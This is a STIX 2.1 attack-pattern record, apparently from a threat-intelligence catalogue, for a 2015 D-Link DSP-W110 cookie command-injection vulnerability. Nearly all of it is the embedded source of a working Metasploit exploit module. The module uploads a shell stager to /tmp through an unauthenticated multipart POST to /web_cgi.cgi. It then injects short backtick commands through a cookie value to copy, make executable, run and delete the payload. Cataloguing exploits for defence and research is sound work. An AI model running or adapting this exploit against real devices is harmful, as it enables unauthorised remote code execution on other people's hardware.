{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--30707947-0f6e-49e0-b68b-9d84eea19c53",
    "created": "2024-08-14T17:01:17.157969Z",
    "modified": "2024-08-14T17:01:17.157973Z",
    "name": "D-Link Cookie Command Execution",
    "description": " This module exploits an anonymous remote upload and code execution vulnerability on different D-Link devices. The vulnerability is a command injection in the cookie handling process of the lighttpd web server when handling specially crafted cookie values. This module has been successfully tested on D-Link DSP-W110A1_FW105B01 in emulated environment. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/dlink_dspw110_cookie_noauth_exec.rb",
            "external_id": "dlink_dspw110_cookie_noauth_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/darkarnium/secpub/tree/master/D-Link/DSP-W110#blogpostincludingPoC"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'D-Link Cookie Command Execution',\n      'Description'    => %q{\n        This module exploits an anonymous remote upload and code execution vulnerability on different\n        D-Link devices. The vulnerability is a command injection in the cookie handling process of the\n        lighttpd web server when handling specially crafted cookie values. This module has been\n        successfully tested on D-Link DSP-W110A1_FW105B01 in emulated environment.\n      },\n      'Author'         =>\n        [\n          'Peter Adkins <peter.adkins[at]kernelpicnic.net>', # vulnerability discovery and initial PoC\n          'Michael Messner <devnull[at]s3cur1ty.de>' # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'Platform'       => 'linux',\n      'References'     =>\n        [\n          ['URL', 'https://github.com/darkarnium/secpub/tree/master/D-Link/DSP-W110'] # blog post including PoC\n        ],\n      'DisclosureDate' => '2015-06-12',\n      'Payload'        =>\n        {\n          'DisableNops' => true\n        },\n      'Targets' =>\n        [\n          [ 'MIPS Little Endian',  # unknown if there are LE devices out there ... but in case we have a target\n            {\n              'Platform' => 'linux',\n              'Arch'     => ARCH_MIPSLE\n            }\n          ],\n          [ 'MIPS Big Endian',\n            {\n              'Platform' => 'linux',\n              'Arch'     => ARCH_MIPSBE\n            }\n          ]\n        ],\n      'DefaultTarget'    => 1\n      ))\n  end\n\n  def check\n    begin\n      res = send_request_cgi({\n        'uri'    => '/',\n        'method' => 'GET'\n      })\n\n      if res && res.headers[\"Server\"] =~ /lighttpd\\/1\\.4\\.34/\n        return Exploit::CheckCode::Detected\n      end\n    rescue ::Rex::ConnectionError\n      return Exploit::CheckCode::Unknown\n    end\n\n    Exploit::CheckCode::Unknown\n  end\n\n  def exploit\n    print_status(\"Trying to access the device ...\")\n\n    unless check == Exploit::CheckCode::Detected\n      fail_with(Failure::Unknown, \"#{peer} - Failed to access the vulnerable device\")\n    end\n\n    print_status(\"Uploading stager ...\")\n    @counter = 1\n    execute_cmdstager(\n      :flavor  => :echo,\n      :linemax => 95  # limited by our upload, larger payloads crash the web server\n    )\n\n    print_status(\"creating payload and executing it ...\")\n\n    (1 .. @counter).each do |act_file|\n      # the http server blocks access to our files ... we copy it to a new one\n      # the length of our command is restricted to 19 characters\n      cmd = \"cp /t*/#{act_file} /tmp/#{act_file+@counter}\"\n      execute_final_command(cmd)\n      cmd = \"chmod +x /tmp/#{act_file+@counter}\"\n      execute_final_command(cmd)\n      cmd = \"/tmp/#{act_file+@counter}\"\n      execute_final_command(cmd)\n      cmd = \"rm /tmp/#{act_file}\"\n      execute_final_command(cmd)\n      cmd = \"rm /tmp/#{act_file+@counter}\"\n      execute_final_command(cmd)\n    end\n  end\n\n  def execute_command(cmd,opts)\n    # upload our stager to a shell script\n    # upload takes quite long because there is no response from the web server\n\n    file_upload = \"#!/bin/sh\\n\"\n    file_upload << cmd << \"\\n\"\n\n    post_data = Rex::MIME::Message.new\n    post_data.add_part(file_upload, nil, \"binary\", \"form-data; name=\\\"#{rand_text_alpha(4)}\\\"; filename=\\\"#{@counter}\\\"\")\n    post_data.bound = \"-#{rand_text_alpha(12)}--\"\n    file = post_data.to_s\n\n    @counter = @counter + 1\n\n    begin\n      send_request_cgi({\n        'method'        => 'POST',\n        'uri'           => \"/web_cgi.cgi\",\n        'vars_get' => {\n          '&request' =>'UploadFile',\n          'path' => '/tmp/'\n        },\n        'encode_params' => false,\n        'ctype'         => \"multipart/form-data; boundary=#{post_data.bound}\",\n        'data'          => file\n      })\n    rescue ::Rex::ConnectionError\n      fail_with(Failure::Unreachable, \"#{peer} - Failed to connect to the web server\")\n    end\n\n  end\n\n  def execute_final_command(cmd)\n    # very limited space - larger commands crash the webserver\n    fail_with(Failure::Unknown, \"#{peer} - Generated command for injection is too long\") if cmd.length > 18\n    begin\n      send_request_cgi({\n        'method'        => 'GET',\n        'uri'           => \"/\",\n        'cookie'        => \"i=`#{cmd}`\"\n      }, 5)\n    rescue ::Rex::ConnectionError\n      fail_with(Failure::Unreachable, \"#{peer} - Failed to connect to the web server\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-06-12",
    "x_mitre_platforms": [
        "linux'"
    ]
}